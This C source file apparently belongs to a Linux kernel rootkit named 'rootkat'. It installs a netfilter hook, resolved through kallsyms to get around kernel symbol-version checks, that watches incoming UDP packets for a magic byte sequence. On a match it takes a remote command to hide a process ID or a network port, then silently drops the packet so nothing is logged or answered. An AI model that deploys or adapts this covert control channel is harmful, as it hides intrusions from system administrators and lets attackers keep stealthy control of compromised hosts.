// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/skbuff.h>
#include <linux/string.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/net_namespace.h>
#include "hidden_pids.h"
#include "hidden_ports.h"
#include "kallsyms.h"
#include "hook_netfilter.h"

#define TAG "rootkat/hook_netfilter: "

static unsigned int rootkat_nf_pre_routing(void *priv, struct sk_buff *skb,
                                           const struct nf_hook_state *state);

static struct nf_hook_ops rootkat_nf_ops = {
	.hook     = rootkat_nf_pre_routing,
	.pf       = NFPROTO_IPV4,
	.hooknum  = NF_INET_PRE_ROUTING,
	.priority = NF_IP_PRI_FIRST,
};

static bool rootkat_nf_installed;

/*
 * nf_register_net_hook / nf_unregister_net_hook are EXPORT_SYMBOL_GPL,
 * but their MODVERSIONS CRCs differ between the Ubuntu 24.04 build-
 * container headers and the actual cloud-image kernel — `insmod` then
 * refuses the module with "disagrees about version of symbol". Resolve
 * them via kallsyms (which doesn't go through MODVERSIONS) and call
 * through fn pointers, mirroring what we do for every other kernel API.
 */
typedef int (*nf_register_net_hook_t)(struct net *net,
                                       const struct nf_hook_ops *reg);
typedef void (*nf_unregister_net_hook_t)(struct net *net,
                                          const struct nf_hook_ops *reg);
static nf_register_net_hook_t   nf_register_fn;
static nf_unregister_net_hook_t nf_unregister_fn;

/*
 * Direct calls to the registry functions. We deliberately bypass
 * lkm/magic_actions.c here: those helpers operate on `current`, but a
 * netfilter hook runs in soft-IRQ context with no meaningful caller —
 * actions delivered via this channel always specify an absolute target
 * via the `arg` field.
 */
static void rootkat_handle_net_magic(u8 action, u32 arg)
{
	switch (action) {
	case ROOTKAT_NET_ACT_HIDE_PID:
		rootkat_hide_pid((pid_t)arg);
		pr_debug(TAG "net hide pid %u\n", arg);
		break;
	case ROOTKAT_NET_ACT_HIDE_PORT:
		rootkat_hide_port((u16)arg);
		pr_debug(TAG "net hide port %u\n", arg);
		break;
	default:
		pr_debug(TAG "unknown net action %u\n", action);
		break;
	}
}

static unsigned int rootkat_nf_pre_routing(void *priv, struct sk_buff *skb,
                                           const struct nf_hook_state *state)
{
	struct iphdr *iph;
	struct udphdr *udph;
	u8 *payload;
	unsigned int hdr_total;
	u8 action;
	u32 arg;

	if (!skb)
		return NF_ACCEPT;

	iph = ip_hdr(skb);
	if (!iph || iph->protocol != IPPROTO_UDP)
		return NF_ACCEPT;

	hdr_total = iph->ihl * 4 + sizeof(struct udphdr);

	/*
	 * Direct skb->data access for the payload, guarded by skb_headlen()
	 * to ensure the bytes we want are in the linear region. We avoid
	 * skb_header_pointer because its slow path calls skb_copy_bits, an
	 * EXPORT_SYMBOL whose CRC has drifted between Ubuntu 24.04 release
	 * snapshots — the inline call would force MODVERSIONS to import
	 * skb_copy_bits and break module load. For loopback UDP with a
	 * 16-byte payload the skb is virtually always linear; if it isn't
	 * we conservatively accept.
	 */
	if (skb_headlen(skb) < hdr_total + ROOTKAT_NET_FRAME_LEN)
		return NF_ACCEPT;

	udph = (struct udphdr *)(skb->data + iph->ihl * 4);
	(void)udph;   /* udph is here for clarity; we don't filter on it */

	payload = skb->data + hdr_total;

	if (memcmp(payload, ROOTKAT_NET_MAGIC, ROOTKAT_NET_MAGIC_LEN))
		return NF_ACCEPT;

	action = payload[ROOTKAT_NET_MAGIC_LEN];
	arg = ntohl(*(__be32 *)(payload + 12));

	rootkat_handle_net_magic(action, arg);

	/* Silently consume — host's UDP stack never sees this packet, so
	 * no socket need be open and no ICMP unreachable is emitted. */
	return NF_DROP;
}

int rootkat_hook_netfilter_install(void)
{
	int rc;

	if (!nf_register_fn) {
		nf_register_fn = (nf_register_net_hook_t)
			rootkat_lookup_name("nf_register_net_hook");
		nf_unregister_fn = (nf_unregister_net_hook_t)
			rootkat_lookup_name("nf_unregister_net_hook");
	}
	if (!nf_register_fn || !nf_unregister_fn) {
		pr_err(TAG "nf_register/unregister_net_hook not resolved\n");
		return -ENOENT;
	}

	rc = nf_register_fn(&init_net, &rootkat_nf_ops);
	if (rc) {
		pr_err(TAG "nf_register_net_hook: %d\n", rc);
		return rc;
	}
	rootkat_nf_installed = true;
	pr_debug(TAG "netfilter hook armed at PRE_ROUTING\n");
	return 0;
}

void rootkat_hook_netfilter_remove(void)
{
	if (!rootkat_nf_installed || !nf_unregister_fn)
		return;
	nf_unregister_fn(&init_net, &rootkat_nf_ops);
	rootkat_nf_installed = false;
	pr_debug(TAG "netfilter hook removed\n");
}
